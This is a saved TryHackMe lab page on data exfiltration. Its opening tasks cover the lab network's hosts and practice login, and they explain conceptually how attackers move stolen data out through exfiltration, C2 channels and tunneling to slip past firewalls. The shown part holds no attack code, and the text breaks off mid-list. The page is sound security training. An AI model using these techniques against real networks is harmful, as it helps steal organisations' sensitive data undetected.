<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Data Exfiltration_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Data Exfiltration_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Data Exfiltration_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Data Exfiltration_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/dataxexfilt#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Data Exfiltration_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Data Exfiltration_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Data Exfiltration_files/notifications.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Data Exfiltration_files/bf86c057f58b26f95802c5499c18ae2a.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">270</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Data Exfiltration_files/e5312ff592695831c1667e10033d13e7.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Data Exfiltration</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/dataxexfilt#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/dataxexfilt#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/dataxexfilt" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Data Exfiltration_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">An introduction to Data Exfiltration and Tunneling techniques over various protocols.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-hard">Hard</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/630a31706458eccfa70c2b2c">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 7514 users are in here and this room is 324 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Data Exfiltration_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px">Welcome to Data Exfiltration</span><br></p><p>Cybercriminals use various internet attacks against companies for different purposes. In most cases, many of these attacks end in data breaches, where threat actors steal sensitive data to sell it on the dark web or publish it online.</p>

<p>Someone may ask: how does a threat actor transfer stolen data from a company's network to the outside, also known as a data breach, without being detected? The answer varies. There are many techniques that a threat actor can perform, including data exfiltration.&nbsp;</p>

<p>Data exfiltration is a non-traditional approach for copying and transferring data from a compromised to an attacker's machine. The data exfiltration technique is used to emulate the normal network activities, and&nbsp;<span style="font-size:1rem"><span>It relies on network protocols such as <a class="MG6gpCrY glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;MG6gpCrY&#39;)">DNS</a>, HTTP, SSH, etc.</span></span><span style="font-size:1rem">&nbsp;Data Exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic.</span></p><p>Some protocols are not designed to carry data over them. However, threat actors find ways to abuse these protocols to bypass network-based security products such as a firewall.&nbsp;<span style="font-size:1rem">Using these techniques as a red teamer is essential to avoid being detected.</span></p><p><span style="font-size:24px">Learning Objectives</span></p><p>This room introduces the data exfiltration types and showcases the techniques used to transfer data over various protocols.<br></p><ul><li>What is Data exfiltration?</li><li><span style="font-size:1rem">Understand data exfiltration types and how they can be used.</span><br></li><li><span>Practice data exfiltration over protocols: Sockets, SSH, ICMP, HTTP(s), and <a class="FjJKg4Uh glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;FjJKg4Uh&#39;)">DNS</a>.</span></li><li><span>Practice <a class="9Fsti2eK glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;9Fsti2eK&#39;)">C2</a> communications over various protocols.</span></li><li><span>Practice establishing Tunneling over <a class="OZt1bIKU glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;OZt1bIKU&#39;)">DNS</a> and HTTP.</span></li></ul><p><span style="font-size:24px">Room Prerequisites</span></p><ul><li><span style="font-size:1rem"><a href="https://tryhackme.com/room/introtonetworking" target="_blank">Introductory Networking</a><br></span></li><li><a href="https://tryhackme.com/room/protocolsandservers" target="_blank">Protocols and Servers</a><br></li><li><span style="font-size:24ptx"><a href="https://tryhackme.com/room/dnsindetail" target="_blank">DNS in Detail</a></span></li><li><a href="https://tryhackme.com/room/dnsmanipulation">DNS Manipulation</a></li><li>Using tmux or similar tools! (for multiple sessions on single SSH login)<br></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Read the task above!</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Network Infrastructure 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62b0be695d591b0042807d6b" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span style="font-size:24px">Network Infrastructure</span><br></p><div><span>For this room, we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The provided <a class="B6CvRe4q glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;B6CvRe4q&#39;)">VM</a> contains two separated networks with multiple clients. We also have a "</span><b>JumpBox</b>" machine that accesses<b>&nbsp;both networks</b>. The following diagram shows more information about the network environment used in this room.<br></div><div style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/224e0380ac936c602fe41c6537ed4565.png" alt="Network Infrastructure"><span style="font-size:16px"><br></span></div>


<p style="text-align:center"></p><p style="text-align:left">Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm.com</span>, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.</p><table class="table table-bordered"><tbody><tr><td><b>Domain Name</b></td><td><b>IP Address</b></td><td><b>Network Access</b></td></tr><tr><td>jump.thm.com</td><td>192.168.0.133</td><td>Net 1 and Net 2</td></tr><tr><td>uploader.thm.com</td><td>172.20.0.100<br></td><td>Net 1</td></tr><tr><td>flag.thm.com<br></td><td><b>***.**.*.***</b></td><td>Net 1</td></tr><tr><td>victim2.thm.com<br></td><td>172.20.0.101<br></td><td>Net 1</td></tr><tr><td>web.thm.com<br></td><td>192.168.0.100<br></td><td>Net 2</td></tr><tr><td>icmp.thm.com<br></td><td>192.168.0.121<br></td><td>Net 2</td></tr><tr><td>victim1.thm.com<br></td><td>192.168.0.101<br></td><td>Net 2</td></tr></tbody></table>
<p></p>

<p></p><p><span style="font-size:24px"><span>Deploy the <a class="n8GIgPdJ glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;n8GIgPdJ&#39;)">VM</a>!</span></span></p><p><span>Deploy the provided <a class="hCsfbrra glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;hCsfbrra&#39;)">VM</a> and connect to it via an SSH client by&nbsp;</span><span style="font-size:1rem">deploying the AttackBox or connecting</span>&nbsp;<u>to the VPN</u><span style="font-size:1rem">.&nbsp;</span><span style="font-size:1rem">Use the following credentials to connect to the&nbsp;<span style="font-weight:bolder">Jumpbox</span>&nbsp;machine with access to the internal networks.</span></p><p style="text-align:center">Machine IP:&nbsp;<span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span><span style="font-size:1rem;text-align:left">&nbsp;</span><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm</span><span style="font-size:1rem;text-align:left">&nbsp;</span><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="font-size:1rem">Password:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tryhackme</span><span style="font-size:1rem;text-align:left">&nbsp;</span></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Connect to the <a class="Zi1hAnTk glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;Zi1hAnTk&#39;)">VM</a> via the SSH client</span></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox$ ssh thm@MACHINE_IP </code>
	    </pre></div></div><p></p><p>Once you are connected to the&nbsp;<span style="font-weight:bolder">Jumpbox&nbsp;</span>machine, you have access to both networks. Check the network infrastructure for more information.</p><p style="text-align:left"><span style="font-size:24px">Lab Recommendation</span></p><ul><li style="text-align:left">We recommend using the <b>JumpBox</b><span>&nbsp;and the network environment for most tasks (<a class="iYZjDHxx glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;iYZjDHxx&#39;)">TCP</a>, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. However, If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span><span style="font-size:1rem"><span>. For more information about changing the <a class="7L56sB6n glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;7L56sB6n&#39;)">DNS</a> for AttackBox, check the DNS configuration (Task 8).</span></span><span style="font-size:1rem">&nbsp;</span><span style="font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px"></span></li></ul><p></p>
<ul><li><span style="font-size:1rem"><span>In most cases, we need to use two machines to establish communication. Thus, we need two or more <a class="haM5UsUr glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;haM5UsUr&#39;)">Linux</a> terminals available to complete the task. Therefore, we recommend using the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tmux</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">tool for creating multiple sessions over a single SSH login.</span><br></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Once you've deployed the VM, please wait a few minutes for the VM and the networks to start, then progress to the next task!
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Data Exfiltration
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px">What is Data Exfiltration</span></p><p>Data Exfiltration is the process of taking an unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside. It is important to note that Data Exfiltration is a post-compromised process where a threat actor has already gained access to a network and performed various activities to get hands on sensitive data. Data Exfiltration often&nbsp;<span style="font-size:1rem">happens at the last stage of the Cyber Kill Chain model, Actions on Objectives.</span></p>

<p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem"><img src="./TryHackMe _ Data Exfiltration_files/c2b48bf0b212e640b259a3405c2391b1.png" alt="Cyber Kill Chain" style="width:832px;height:327.85130111524165px"><span style="box-sizing:border-box;font-size:1rem"><br></span></p>

<p><span style="font-size:1rem"><span>Data exfiltration is also used to hide an adversary's malicious activities and bypass security products. For example, the <a class="sMUMAif5 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;sMUMAif5&#39;)">DNS</a> exfiltration technique can evade security products, such as a firewall.</span></span><br></p><p>Sensitive data can be in various types and forms, and it may contain the following: </p><ul><li>Usernames and passwords or any authentication information.</li><li>Bank accounts details</li><li>Business strategic decisions. </li><li>Cryptographic keys.</li><li>Employee and personnel information.</li><li>Project code data.</li></ul><p><span style="font-size:24px">How to use Data Exfiltration</span></p><p>There are three primary&nbsp;use case scenarios of data exfiltration, including:</p><ol><li>Exfiltrate data</li><li>Command and control communications.</li><li>Tunneling</li></ol><p><b>Traditional Data Exfiltration</b></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/0c3438995ccff35a5589b9abd3703b14.png" alt="Traditional Data Exifltration"></p><p style="text-align:left">The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocol&nbsp;<span style="font-size:1rem">used</span><span style="font-size:1rem">. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.</span></p><p><b><span><a class="ZbWkMINh glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;ZbWkMINh&#39;)">C2</a> Communications</span></b></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/49ad248f2506a5a749dbb70732c32072.png" alt="C2 Communications"></p><p style="text-align:left"><span>Many <a class="FprwQweX glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;FprwQweX&#39;)">C2</a> frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. In C2 communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.</span></p><p><b>Tunneling</b></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/b4c99b2aba13eac24379fee2d20ffbf6.png" alt="Tunneling communication"><br></p><p>In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.</p><p>In the coming tasks, we will discuss the following techniques and use cases:</p><ul><li><span>Exfiltrate using <a class="s1ceIwSP glossary-term" 